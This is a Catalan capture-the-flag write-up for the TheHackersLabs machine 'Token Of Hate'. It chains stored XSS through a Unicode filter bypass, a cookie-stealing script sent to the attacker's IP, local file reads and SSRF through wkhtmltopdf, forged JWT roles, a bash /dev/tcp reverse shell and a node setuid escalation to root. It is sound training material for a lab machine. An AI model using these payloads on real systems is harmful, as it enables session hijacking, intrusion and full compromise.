---
author: Lenam
pubDatetime: 2025-03-22T00:00:00Z
title: WriteUp Token Of Hate - TheHackersLabs
urlSlug: token-of-hate-writeup-thehackerslabs-ca
featured: false
draft: false
ogImage: "../../../assets/images/token-of-hate/OpenGraph.png"
tags:
  - writeup
  - thehackerslabs
  - jwt
  - xss
  - ssrf
  - lfi
  - rce
  - capabilities
  - cookie hijacking
description:
  Resolució d’un CTF de TheHackersLabs, amb enumeració, explotació d’XSS emmagatzemat via Unicode, segrest de cookies, atacs LFI i SSRF, manipulació de JWT per a RCE i escalada de privilegis amb capabilities en Linux.
lang: ca
translationId: token-of-hate-writeup-thehackerslabs
---
![Rabbit Token Of Hate](../../../assets/images/token-of-hate/OpenGraph.png)

Resolució d’un CTF de TheHackersLabs, amb enumeració, explotació d’XSS emmagatzemat via Unicode, segrest de cookies, atacs LFI i SSRF, manipulació de JWT per a RCE i escalada de privilegis amb capabilities en Linux.

## Taula de continguts

## Enumeració

![alt text](../../../assets/images/token-of-hate/image.png)

Fem un ping i observem pel TTL 64 que és una màquina amb sistema operatiu `Linux`.

```bash
$ ping -c 1 192.168.1.117
PING 192.168.1.117 (192.168.1.117) 56(84) bytes of data.
64 bytes from 192.168.1.117: icmp_seq=1 ttl=64 time=0.195 ms

--- 192.168.1.117 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.195/0.195/0.195/0.000 ms
```

Comencem amb una anàlisi ràpida de tots els ports de la màquina.

```bash
$ nmap -p- -Pn -n 192.168.1.117
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-21 21:22 CET
Nmap scan report for 192.168.1.117
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds
```

Trobem dos ports oberts, el 22 `ssh` i el 80 `http`. A continuació fem una anàlisi més exhaustiva per esbrinar més sobre els serveis als ports 80 i 22.

```bash
$ nmap -p22,80 -sVC -T4 -Pn -n 192.168.1.117
Starting Nmap 7.93 ( https://nmap.org ) at 2025-03-21 21:23 CET
Nmap scan report for 192.168.1.117
Host is up (0.00017s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 fd6a7017f74007feeb5a5d365632f039 (ECDSA)
|_  256 2d3d4ba1f6e38d91094ca8b3857db5c1 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Home
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.65 seconds
```

No descobrim més informació amb l’anàlisi exhaustiva de nmap. Executem `whatweb` per veure si podem obtenir més dades sobre el lloc web.

```bash
$ whatweb -v 192.168.1.117
WhatWeb report for http://192.168.1.117
Status    : 200 OK
Title     : Home
IP        : 192.168.1.117
Country   : RESERVED, ZZ

Summary   : Apache[2.4.62], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.62 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Debian Linux
        String       : Apache/2.4.62 (Debian) (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Fri, 21 Mar 2025 20:44:12 GMT
        Server: Apache/2.4.62 (Debian)
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 1504
        Connection: close
        Content-Type: text/html; charset=UTF-8

```

A més, fem un escaneig `fuzzing` de diferents endpoints o fitxers dins el servei web mitjançant `gobuster` amb el diccionari `directory-list-2.3-medium.txt` de `seclist`.

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.117 -x .php,.txt,.zip,.db,.htm,.html,.phar,.db,.asp,.aspx
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.117
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,php,txt,htm,phar,aspx,zip,db,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.htm                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 2952]
/login.php            (Status: 200) [Size: 1054]
/.html                (Status: 403) [Size: 278]
/.phar                (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://192.168.1.117/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/registro.php         (Status: 200) [Size: 1089]
/.html                (Status: 403) [Size: 278]
/.phar                (Status: 403) [Size: 278]
/.htm                 (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 2205590 / 2205600 (100.00%)
===============================================================
Finished
===============================================================

```

### Enumeració manual

Obrim el lloc web del port 80 al navegador.

![alt text](../../../assets/images/token-of-hate/image-1.png)

Ens trobem amb un lloc web; si hi parem atenció, ens aporta diverses pistes sobre com podria anar la intrusió.

- Explica que l’aplicació, per a ús intern, transforma els noms d’usuari als seus caràcters ASCII equivalents.
- També indica que l’usuari administrador sempre estarà revisant els nous registres.

A més, hi trobem dos enllaços: un a un formulari de registre `Ir a Registro`.

![alt text](../../../assets/images/token-of-hate/image-2.png)

Amb el codi font següent.

**registro.php**

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Registro</title>
  <link rel="stylesheet" href="hoja.css">

  <script>
    // Validación en el cliente: se rechazan los caracteres prohibidos (<, >, ", ', &)
    function validarUsername() {
      /*
      var username = document.getElementById("username").value;
      var regex = /[<>"'&]/;
      if (regex.test(username)) {
        alert("El nombre de usuario contiene caracteres HTML prohibidos.");
        return false;
      }
        */
      return true;
    }
  </script>
</head>
<body>
  <h1 class="blink">Registro</h1>
  <form action="procesarRegistro.php" method="post" onsubmit="return validarUsername();">
    <label for="username">Nombre de usuario:</label>
    <input type="text" name="username" id="username" required>
    <br>
    <label for="password">Contraseña:</label>
    <input type="password" name="password" id="password" required>
    <br>
    <input type="submit" value="Registrarse">
  </form>
  <p><a href="login.php">Ir a Login</a></p>
  <p><a href="/">Home</a></p>
</body>
</html>

```

I un altre enllaç que mostra el formulari de login `Ir a Login`.

![alt text](../../../assets/images/token-of-hate/image-3.png)

Amb el següent codi font.

**login.php**

```html
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <script>
    // Validación en el cliente para evitar caracteres HTML prohibidos
    function validarUsername() {
      var username = document.getElementById("username").value;
      var regex = /[<>"'&]/;
      if (regex.test(username)) {
        alert("El nombre de usuario contiene caracteres HTML prohibidos.");
        return false;
      }
      return true;
    }
  </script>
  <link rel="stylesheet" href="hoja.css">

</head>
<body>
  <h1 class="blink">Login</h1>
  <form action="procesarLogin.php" method="post" onsubmit="return validarUsername();">
    <label for="username">Nombre de usuario:</label>
    <input type="text" name="username" id="username" required>
    <br>
    <label for="password">Contraseña:</label>
    <input type="password" name="password" id="password" required>
    <br>
    <input type="submit" value="Iniciar Sesión">
  </form>
  <p><a href="registro.php">Ir a Registro</a></p>
  <p><a href="/">Home</a></p>
</body>
</html>
```

Ens registrem amb qualsevol usuari i contrasenya i iniciem sessió amb el mateix usuari. Ens trobem amb una pàgina privada.

![alt text](../../../assets/images/token-of-hate/image-4.png)

Si mirem el codi font d’aquesta pàgina, hi trobarem alguna pista més als comentaris.

**pagina_privada.php**

```html
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <title>Página Privada</title>
    <link rel="stylesheet" href="hoja.css">
</head>

<body>
    <h1>Página Privada</h1>
    <p>Bienvenido, lenam!</p>

    <!-- Sección visible para todos los usuarios validados -->
    <section id="seccion_users">
        <h2>Contenido para Usuarios</h2>
        <p>Este contenido es visible para todos los usuarios autenticados (roles "user" y "admin").</p>
    </section>

    <!-- Sección exclusiva para usuarios con rol "admin" -->
  

    <p><a href="logout.php">Cerrar sesión</a></p>
</body>

</html>
```

Observem que la cookie del navegador, creada amb la nostra sessió iniciada, no té activades les flags `HttpOnly`, `Secure` ni `SameSite`.

![alt text](../../../assets/images/token-of-hate/image-5.png)

## Intrusió

### Pistes per a la intrusió

- Al text de la pàgina inicial `index.php` s’explica que l’usuari administrador està revisant els nous registres d’usuaris.
- També s’explica a la pàgina inicial que, per als noms d’usuari, es poden utilitzar caràcters `Unicode`, i aquests es transformen a ASCII internament.
- A les capçaleres de `whatweb` veiem que no s’utilitza cap capçalera `CSP` per protegir d’XSS, ni tampoc cap configuració de `CORS`.
- La cookie de sessió generada per l’aplicació no té cap protecció per a la seva lectura o enviament.
- Al codi font de `login.php`, observem que no es permeten els caràcters `<>"'&` per al nom d’usuari.

### XSS emmagatzemat

Primer, haurem de crear un usuari que ens permeti incloure un script a la pàgina (Stored XSS). Per aconseguir-ho, ens aprofitarem dels caràcters `Unicode`. Si introduïm algun dels caràcters prohibits `<>"'&`, no ho aconseguirem, però podem substituir aquests caràcters per equivalents que només existeixin en `Unicode`; en convertir-los a ASCII internament, obtindrem el desitjat.

| ASCII | Unicode |
| :---: | ------- |
|   <   | ＜      |
|   >   | ＞      |
|   "   | “      |
|   '   | ’      |
|   &   | ＆      |

Preparem un petit script en bash per facilitar-ho.

```bash
#!/usr/bin/env bash
#
# Uso:
#   ./transformar.sh "Texto con & < > ' y \""
#
# El script imprimirá el texto transformado por stdout con posibles equivalente ASCII en unicode

INPUT="$1"

#    - &   => ＆ (U+FF06, Fullwidth Ampersand)
#    - <   => ＜ (U+FF1C, Fullwidth Less-Than Sign)
#    - >   => ＞ (U+FF1E, Fullwidth Greater-Than Sign)
#    - '   => ’ (U+2019, Right Single Quotation Mark)
#    - "   => “ (U+201C, Left Double Quotation Mark)
OUTPUT="$(echo "$INPUT" | sed -E \
  -e 's/&/＆/g' \
  -e 's/</＜/g' \
  -e 's/>/＞/g' \
  -e "s/'/’/g" \
  -e 's/\"/“/g'
)"

echo "$OUTPUT"
```

També ho podem fer de manera manual. Al nostre cas, executem la següent comanda i copiem el resultat per fer-lo servir com a nom d’usuari en el registre.

```bash
./transformar.sh '<script src="http://[IP-atacante]/script.js"></script>'
```

En el meu cas:

```bash
$ ./tranformar.sh '<script src="http://192.168.1.181/script.js"></script>'
＜script src=“http://192.168.1.181/script.js“＞＜/script＞
```

![alt text](../../../assets/images/token-of-hate/image-6.png)

D’altra banda, creem un servei web amb python al port 80 i ens posem a escoltar. En poc temps rebem una petició.

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.117 - - [21/Mar/2025 23:41:21] code 404, message File not found
192.168.1.117 - - [21/Mar/2025 23:41:21] "GET /script.js HTTP/1.1" 404 -
```

### Segrest de cookies

Com que el Store XSS va fent peticions al nostre servei http buscant el fitxer `script.js`, només haurem de modificar aquest fitxer per executar codi javascript al navegador de la víctima.

Executem el següent codi per crear el fitxer `script.js` a la mateixa carpeta que està compartint el nostre servei web.

```bash
$ echo 'x=new XMLHttpRequest;x.open("GET","http://[IP-atacante]?cookie="+btoa(document.cookie));x.send();' > script.js
```

Al meu cas:

```bash
$ echo 'x=new XMLHttpRequest;x.open("GET","http://192.168.1.181?cookie="+btoa(document.cookie));x.send();' > script.js
```

I rebem la cookie d’un usuari en format base64 al nostre servei web.

```bash
192.168.1.117 - - [21/Mar/2025 23:46:44] "GET /script.js HTTP/1.1" 304 -
192.168.1.117 - - [21/Mar/2025 23:46:44] "GET /?cookie=UEhQU0VTU0lEPXNkM3EzZWVnMHY3Y2wzcGhpbTVyMjFpcWFo HTTP/1.1" 200 -
```

Descodifiquem el base64 de la cookie i veiem que és la mateixa cookie que es va crear en iniciar sessió amb el nostre usuari, però amb un altre valor.

```bash
$ echo UEhQU0VTU0lEPXNkM3EzZWVnMHY3Y2wzcGhpbTVyMjFpcWFo | base64 -d
PHPSESSID=sd3q3eeg0v7cl3phim5r21iqah  
```

Iniciem sessió al navegador amb el primer usuari de prova que vam crear (si cal, en creem un altre des del formulari de registre). Un cop hem iniciat sessió, des de les eines de desenvolupador del navegador, a la pestanya `Storage > Cookies`, modifiquem el valor de la cookie de sessió `PHPSESSID` pel rebut al nostre servei web i després actualitzem la pàgina.

![alt text](../../../assets/images/token-of-hate/image-7.png)

Obtenim accés com a usuari amb rol d’administrador a l’aplicació web; ara podem veure tots els usuaris registrats, eliminar-los i descarregar un document PDF amb tots els usuaris.

![alt text](../../../assets/images/token-of-hate/image-8.png)

### Inclusió de fitxer local (LFI)

En generar el document PDF, veiem que rebem peticions al nostre servei web però sense cap dada per a la cookie.

```
192.168.1.117 - - [22/Mar/2025 00:00:31] "GET /?cookie= HTTP/1.1" 200 -
```

Descarreguem el PDF generat amb el llistat d’usuaris i l’analitzem.

![alt text](../../../assets/images/token-of-hate/image-9.png)

Observem amb `exiftool` que està generat amb `wkhtmltopdf 0.12.6`, una eina molt popular per transformar `HTML` en `PDF`.

Modifiquem el fitxer `script.js` del nostre servei web amb python per intentar llegir algun fitxer del servidor.

```javascript
x=new XMLHttpRequest;
x.onload=function(){
  document.write("<pre>"+this.responseText+"</pre>");
};
x.open("GET","file:///etc/passwd");
x.send();
```

Descarreguem el document PDF i obtenim el fitxer `/etc/passwd`.

![alt text](../../../assets/images/token-of-hate/image-10.png)

Podem continuar llegint diversos fitxers del servidor, però trobem unes credencials filtrades al fitxer `/var/www/html/index.php`.

![alt text](../../../assets/images/token-of-hate/image-11.png)

Les apuntem per recordar-les.

```text
['admin', 'dUnAyw92B7qD4OVIqWXd', 'admin'],
['Łukasz', 'dQnwTCpdCUGGqBQXedLd', 'user'],
['Þór', 'EYNlxMUjTbEDbNWSvwvQ', 'user'],
['Ægir', 'DXwgeMuQBAtCWPPQpJtv', 'user'],
['Çetin', 'FuLqqEAErWQsmTQQQhsb', 'user'],
['José', 'FuLqqEAErWQsmTQQQhsb', 'user'],
```

### Sol·licituds a recursos interns (SSRF)

Utilitzem el mateix Store XSS per mirar de descobrir recursos interns del servidor. Tornem a modificar el fitxer `script.js` del nostre servei web per fer un escaneig intern dels ports més habituals utilitzats per `http`. Cal canviar la IP `192.168.1.181` per la del vostre servei web.

```javascript
const ports=[66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6346,6347,7001,7002,8000,8080,8443,8888,30821];
function handleLoad(x,p) {
  let y=new XMLHttpRequest();
  y.open("GET",`http://192.168.1.181/ping?port=${p}`);
  y.send();
}
ports.forEach( (p,i) =>
  setTimeout( () => {
    let x=new XMLHttpRequest();
    x.open("GET",`http://localhost:${p}`);
    x.timeout=300;
    x.onload=()=>handleLoad(x,p);x.send();
  }, i*10)
);
```

Observem que, a banda del port `80`, també hi ha el port `3000` obert de manera interna.

```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.117 - - [22/Mar/2025 00:24:05] "GET /script.js HTTP/1.1" 304 -
192.168.1.117 - - [22/Mar/2025 00:24:05] code 404, message File not found
192.168.1.117 - - [22/Mar/2025 00:24:05] "GET /ping?port=80 HTTP/1.1" 404 - <---
192.168.1.117 - - [22/Mar/2025 00:24:06] code 404, message File not found
192.168.1.117 - - [22/Mar/2025 00:24:06] "GET /ping?port=3000 HTTP/1.1" 404 - <---
```

Tornem a modificar el fitxer `script.js` per visualitzar la resposta al port 3000.

```javascript
x=new XMLHttpRequest;
x.onload=function(){
  document.write("<div>"+this.responseText+"</div>")
};
x.open("GET","http://localhost:3000");
x.send();
```

Descarreguem el PDF i obtenim un text en format JSON.

![alt text](../../../assets/images/token-of-hate/image-12.png)

```json
{
   "name":"API de Comandos",
   "version":"1.2.0",
   "description":"API para autenticación y ejecución de comandos utilizando
un token.",
   "endpoints":{
      "/":{
         "method":"GET",
         "description":"Muestra la información de la API y la descripción de los
endpoints disponibles."
      },
      "/login":{
         "method":"POST",
         "description":"Permite iniciar sesión. Se espera un body en formato
JSON con 'username' y 'password'. Si el login es correcto, se retorna un token JWT. Ejemplo: { \"username\": \"test\",
\"password\": \"123456\" }"
      },
      "/command":{
         "method":"POST",
         "description":"Ejecuta un comando del sistema para
usuarios autenticados con rol admin. Se espera un body en formato JSON con 'command' y 'token' o enviando el token
en la cabecera 'Authorization'. Ejemplo: { \"command\": \"ls -la\", \"token\": \"token_jwt\" }"
      }
   }
}
```

Sembla el manual d’una API interna que permet executar ordres. Tornem a modificar el nostre fitxer `script.js` per intentar validar algun dels usuaris trobats al fitxer `/var/www/html/index.php`.

A més, com que internament s’utilitza la versió ASCII dels noms d’usuari, afegim a la llista els noms transformats a ASCII i també la seva versió en minúscules.

```javascript
const users = [
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "Łukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "Þór", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "Ægir", ipasd: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "Çetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "José", pas: "FuLqqEAErWQsmTQQQhsb" },
    // Versión en ASCII de los nombres de usuarios.
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "Lukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "Thor", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "AEgir", pas: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "Cetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "Jose", pas: "FuLqqEAErWQsmTQQQhsb" },
    // Versión en ASCII de los nombres de usuarios y en minusculas.
    { nombre: "admin", pas: "dUnAyw92B7qD4OVIqWXd" },
    { nombre: "lukasz", pas: "dQnwTCpdCUGGqBQXedLd" },
    { nombre: "thor", pas: "EYNlxMUjTbEDbNWSvwvQ" },
    { nombre: "aegir", pas: "DXwgeMuQBAtCWPPQpJtv" },
    { nombre: "cetin", pas: "FuLqqEAErWQsmTQQQhsb" },
    { nombre: "jose", pas: "FuLqqEAErWQsmTQQQhsb" }
];

function testUser(user) {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:3000/login", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onload = () => {
        if (xhr.status >= 200)
            new Image().src = `http://192.168.1.181/?user=${user.username}&response=${btoa(xhr.responseText)}`
    }
    xhr.send(JSON.stringify(user));
}

users.forEach(async user => {
    // Envía la petición con el body en JSON
    testUser({
        username: user.nombre,
        password: user.pas
    });
});
```

Esperem una estona i, de seguida, rebem totes les peticions al nostre servei web. Si ens hi fixem, les dades més extenses són les de l’usuari `Jose`, amb la primera lletra en majúscula i sense accent.

![alt text](../../../assets/images/token-of-hate/image-13.png)

Descodifiquem el base64 de la resposta de la petició de login per a l’usuari `Jose`.

```bash
$ echo eyJtZXNzYWdlIjoiTG9naW4gY29ycmVjdG8iLCJ0b2tlbiI6ImV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUoxYzJWeWJtRnRaU0k2SWtwdmMyVWlMQ0p5YjJ4bElqb2lkWE5sY2lJc0ltbGhkQ0k2TVRjME1qWXdNalF3TWl3aVpYaHdJam94TnpReU5qQTJNREF5ZlEuWFEwT1QzWng4VmYtZGlpNmxQX0hFNER6emYtOVQxWUhuVlk3VXhPTWU2cyJ9|base64 -d
{"message":"Login correcto","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MjYwMjQwMiwiZXhwIjoxNzQyNjA2MDAyfQ.XQ0OT3Zx8Vf-dii6lP_HE4Dzzf-9T1YHnVY7UxOMe6s"}
```

Obtenim un JSON amb un missatge i un token, tal com deia l’endpoint principal de l’API, que sembla ser JWT.

### Execució remota (RCE)

Descodifiquem el token JWT per veure’n el temps de validesa, el tipus d’encriptació i les dades del payload.

**Token JWT obtingut**

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0MjYwMjQwMiwiZXhwIjoxNzQyNjA2MDAyfQ.XQ0OT3Zx8Vf-dii6lP_HE4Dzzf-9T1YHnVY7UxOMe6s
```

Per descodificar-lo, utilitzem el lloc web http://jwt.io.

![alt text](../../../assets/images/token-of-hate/image-14.png)

Observem que el token utilitza l’algoritme `HS256` (paràmetre `alg` de l’HEADER) i que el temps de validesa després del login és d’una hora. Això s’obté dels paràmetres `exp` (emès en format UNIX timestamp) i `iat` (expira en format UNIX timestamp) del PAYLOAD.

```
1742606002 - 1742602402 = 3600 segons = 1 hora
```

Això vol dir que, si triguem més d’una hora a utilitzar el token, haurem de sol·licitar-ne un de nou mitjançant la validació de l’usuari. A més, també veiem al PAYLOAD que el token pertany a l’usuari `Jose` amb el rol `user`.

Ens interessa executar la comanda de l’endpoint `/command` de l’API interna. Si recordem la informació obtinguda d’aquest endpoint, indica que només serveix per al rol `admin` i el token obtingut de l’usuari `Jose` és un rol de `user`.

```json
      "/command":{
         "method":"POST",
         "description":"Ejecuta un comando del sistema para
usuarios autenticados con rol admin. Se espera un body en formato JSON con 'command' y 'token' o enviando el token
en la cabecera 'Authorization'. Ejemplo: { \"command\": \"ls -la\", \"token\": \"token_jwt\" }"
      }
```

Podem manipular el token JWT per modificar el paràmetre `role` de la part del PAYLOAD. Si el backend de l’aplicació no valida la signatura del token correctament, podrem fer-nos passar per un usuari amb el rol `admin`.

Això ho podem fer manualment o amb l’script següent, que ho automatitza. Tornem a modificar el nostre fitxer `script.js`.

```javascript
var command = "id";

// Petición para realizar el login y obtener el token actualizado.
petition1 = new XMLHttpRequest();
petition1.open('POST', 'http://localhost:3000/login', true);
petition1.setRequestHeader('Content-Type', 'application/json');

// Petición para ejecutar el comando.
petition2 = new XMLHttpRequest();
petition2.open('POST', 'http://localhost:3000/command', true);
petition2.setRequestHeader('Content-Type', 'application/json');

function base64urlDecode(str) {
    // Reemplaza caracteres específicos de Base64URL
    str = str.replace(/-/g, '+').replace(/_/g, '/');
    // Añadir padding si es necesario
    while (str.length % 4) {
        str += '=';
    }
    return atob(str);
}

function base64urlEncode(str) {
    return btoa(str)
        .replace(/\+/g, '-')
        .replace(/\//g, '_')
        .replace(/=+$/, '');
}

petition2.onload = () => {
    document.write("Resultado");
    document.write(petition2.responseText);
}

petition1.onload = () => {
    // Obtenemos el token JWT y lo separamos en sus partes.
    let tokenParts = JSON.parse(petition1.responseText).token.split(".");

    // Decodificamos la parte del payload y la convertimos en objeto.
    let payloadDecoded = JSON.parse(base64urlDecode(tokenParts[1]));

    // Modificamos el role del usuario.
    payloadDecoded.role = "admin";

    // Codificamos nuevamente el payload modificado.
    tokenParts[1] = base64urlEncode(JSON.stringify(payloadDecoded));

    // Reconstruimos el token modificado.
    let tokenModificado = tokenParts.join(".");

    sendSecondPetition(tokenModificado);
}

function sendSecondPetition(tokenModificado) {
    petition2.send(`{"token":"${tokenModificado}","command":"${command}"}`);
}

petition1.send('{"username":"Jose","password":"FuLqqEAErWQsmTQQQhsb"}');
```

Tornem a descarregar un altre fitxer PDF i obtenim execució de comandes amb l’usuari `ctesias`.

![alt text](../../../assets/images/token-of-hate/image-15.png)

Modifiquem la primera variable `command` del nostre javascript al fitxer `script.js`, introduint la IP de la nostra màquina atacant.

```javascript
var command = "bash -c 'bash -i >& /dev/tcp/192.168.1.181/12345 0>&1'";
```

Ens posem a escoltar amb netcat pel port `12345` i després creem un altre document PDF.

```bash
$ nc -lvnp 12345
listening on [any] 12345 ...
connect to [192.168.1.181] from (UNKNOWN) [192.168.1.117] 40170
bash: no se puede establecer el grupo de proceso de terminal (497): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
ctesias@tokenofhate:/$ 
```

Aconseguim entrar a la màquina víctima com a usuari `ctesias`.

![alt text](../../../assets/images/token-of-hate/image-16.png)

Podem llegir la flag de user.txt.

```bash
tesias@tokenofhate:~$ cat user.txt
cat user.txt
98XXXXXXXXXXXXXXXXXXXXXXXXXXXXa3
```

## Escalada de privilegis

Fem el tractament del terminal o introduïm la nostra clau pública SSH per treballar més còmodes al servidor.

Mirem els fitxers amb capabilites.

```bash
$ getcap -r /
getcap -r /
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/yournode cap_setuid=ep
```

Trobem un binari molt sospitós, `/usr/bin/yournode`, i comprovem que és una còpia de `nodejs`.

```bash
$ /usr/bin/yournode
Welcome to Node.js v18.19.0.
Type ".help" for more information.
> .exit
$ /usr/bin/yournode --version
v18.19.0
```

Cerquem a `gtfobins` una manera d’escalar amb el binari `node` i capabilites, i la trobem.

![alt text](../../../assets/images/token-of-hate/image-17.png)

Executem la següent comanda per aconseguir privilegis de root.

```bash
ctesias@tokenofhate:~$ /usr/bin/yournode -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
# id
uid=0(root) gid=1000(ctesias) grupos=1000(ctesias),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
# 
```

Podem llegir la flag de `root.txt`.

```bash
# cat /root/root.txt
b6XXXXXXXXXXXXXXXXXXXXXX2d
```

Felicitats! Si has arribat fins aquí, has aconseguit les flags, però encara podria ser que no ho hagis trobat tot.

T’has fixat en la imatge del conill `hate` del principi? També pertany a aquest CTF. Si no l’has trobat, és que no has mirat pertot arreu 😉.
